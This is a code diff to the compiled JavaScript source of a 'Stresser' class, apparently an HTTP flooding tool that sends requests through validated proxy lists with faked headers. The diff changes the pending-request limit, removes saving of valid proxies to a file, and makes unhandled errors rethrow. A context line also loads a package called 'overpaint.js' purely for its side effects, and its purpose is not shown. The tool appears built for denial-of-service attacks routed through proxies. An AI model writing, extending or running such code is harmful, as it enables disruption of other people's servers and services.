@@ -18,7 +18,6 @@ const http_1 = __importDefault(require("http"));
 require("overpaint.js");
 const axios_1 = __importDefault(require("axios"));
 const faker_1 = require("@faker-js/faker");
-const Utils_1 = require("../utils/Utils");
 const PacketType_1 = require("../enums/PacketType");
 const Stats_1 = require("./Stats");
 const Packet_1 = require("../types/Packet");
@@ -55,7 +54,7 @@ class Stresser {
         return new Promise((resolve, reject) => {
             var _a;
             try {
-                if (this.stats.pending >= this.options.threads)
+                if (this.stats.pending >= this.options.maxPending)
                     resolve(null);
                 this.requestSent();
                 // create headers
@@ -114,7 +113,7 @@ class Stresser {
      */
     makeRequest(proxy) {
         return __awaiter(this, void 0, void 0, function* () {
-            if (this.stats.pending >= this.options.threads)
+            if (this.stats.pending >= this.options.maxPending)
                 return null;
             // create headers
             let headers = {
@@ -205,9 +204,7 @@ class Stresser {
             (_a = process.send) === null || _a === void 0 ? void 0 : _a.call(process, (0, Packet_1.Packet)(PacketType_1.PacketType.Log, (0, Log_1.Log)(LogType_1.LogType.Info, `Validating proxies...`)));
             // filter out invalid proxies
             let valid_proxies = proxies.filter((proxy, index) => proxy_results[index]);
-            // save valid proxies to file
-            let txt_data = valid_proxies.map(proxy => proxy.join(':')).join('\n');
-            (0, Utils_1.setStatic)('valid_proxies.txt', txt_data);
+            // return valid proxies
             return valid_proxies;
         });
     }
@@ -243,6 +240,10 @@ class Stresser {
     }
 }
 exports.Stresser = Stresser;
-process.on('uncaughtException', () => { });
-process.on('unhandledRejection', () => { });
+process.on('uncaughtException', (error) => {
+    throw error;
+});
+process.on('unhandledRejection', (error) => {
+    throw error;
+});
 //# sourceMappingURL=Stresser.js.map
